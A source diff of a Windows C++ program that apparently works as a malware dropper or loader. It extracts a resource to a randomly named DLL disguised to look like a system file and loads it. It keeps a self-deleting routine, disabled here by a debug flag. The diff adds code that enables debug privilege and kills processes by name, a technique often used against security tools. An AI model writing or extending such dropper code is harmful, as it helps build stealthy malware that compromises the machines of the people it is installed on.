@@ -4,7 +4,12 @@
 #include "stdafx.h"
 #include "TLHELP32.H"
 #include "resource.h"
-#include <shellapi.h>
+
+#include <shlwapi.h> //StrStrI
+#pragma comment(lib, "shlwapi.lib") 
+
+#define INSTALLER_DEBUG
+
 
 typedef int(__stdcall *lpAddFun)(int, int); //宏定义函数指针类型
 
@@ -76,7 +81,7 @@ BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR 
 	return TRUE;
 }
 
-
+#ifndef INSTALLER_DEBUG
 //运行完后删除本身
 void DelSelf()
 {
@@ -121,16 +126,106 @@ void DelSelf()
 	}
 }
 //在其中出现了宽字节的问题，很麻烦 Tchar 就是宽字节
+#endif
+
+////////////////////////// 功能代码段 /////////////////////////////////////////////////////
+BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
+{
+	HANDLE hToken = NULL;
+	TOKEN_PRIVILEGES tp;
+	LUID luid;
+
+	if (OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) == 0)
+	{
+		return FALSE;
+	}
+
+	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
+	{
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	if (bEnablePrivilege)
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	else
+		tp.Privileges[0].Attributes = 0;
+
+	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
+	{
+		CloseHandle(hToken);
+		return FALSE;
+	}
+	return TRUE;
+}
+
+DWORD GetPidByName(LPCSTR szProcName)
+{
+	DWORD dwPid = 0;
+	BOOL bRet = FALSE;
+	HANDLE Snapshot;
+	PROCESSENTRY32 processListStr;
+
+	Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	processListStr.dwSize = sizeof(PROCESSENTRY32);
+	bRet = Process32First(Snapshot, &processListStr);
+	while (bRet)
+	{
+		if (StrStrI(processListStr.szExeFile, szProcName) != NULL)
+		{
+			dwPid = processListStr.th32ProcessID;
+			break;
+		}
+
+		bRet = Process32Next(Snapshot, &processListStr);
+	}
+
+	CloseHandle(Snapshot);
+
+	return dwPid;
+}
+
+BOOL KillProcessByPid(DWORD dwPid)
+{
+	SetPrivilege(SE_DEBUG_NAME, TRUE);
+	// 打开目标进程，取得进程句柄
+	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+	if (hProcess == NULL) return FALSE;
+	// 终止进程
+	BOOL bRet = ::TerminateProcess(hProcess, 0);
+	CloseHandle(hProcess);
+	return bRet;
+}
+
+BOOL KillProcessByName(LPCSTR szProcName)
+{
+	DWORD dwPid = GetPidByName(szProcName);
+	if (dwPid == 0) return FALSE;
+
+	return KillProcessByPid(dwPid);
+}
+//////////////////////////////////////////////////////////////////////////////
 
 int main()
 {
 	
 	char mDllPath[MAX_PATH];
 	char mCurrentPath[MAX_PATH];
+	char mSysPath[MAX_PATH];
+
+	//按名字结束进程
+	//KillProcessByName("");
+	
 
 	GetCurrentDirectory(MAX_PATH, mCurrentPath);
 	printf(mCurrentPath);
 	
+	//随机生成dll 在当前的文件目录下
+	//实际上dll 理应存在于 system目录下
+	GetSystemDirectory(mSysPath, MAX_PATH);
+
 	wsprintf(mDllPath, "%s\\S%cm%ct%cH.dll", mCurrentPath, SEU_RandEx('a', 'z'), SEU_RandEx('b', 'y'), SEU_RandEx('c', 'x'));
 	printf(mDllPath);
 
@@ -167,8 +262,9 @@ int main()
 		cout << "\n Dll load failed! \n";
 		return 0;
 	}
-
+#ifndef INSTALLER_DEBUG
 	DelSelf();
+#endif
     return 0;
 }
 
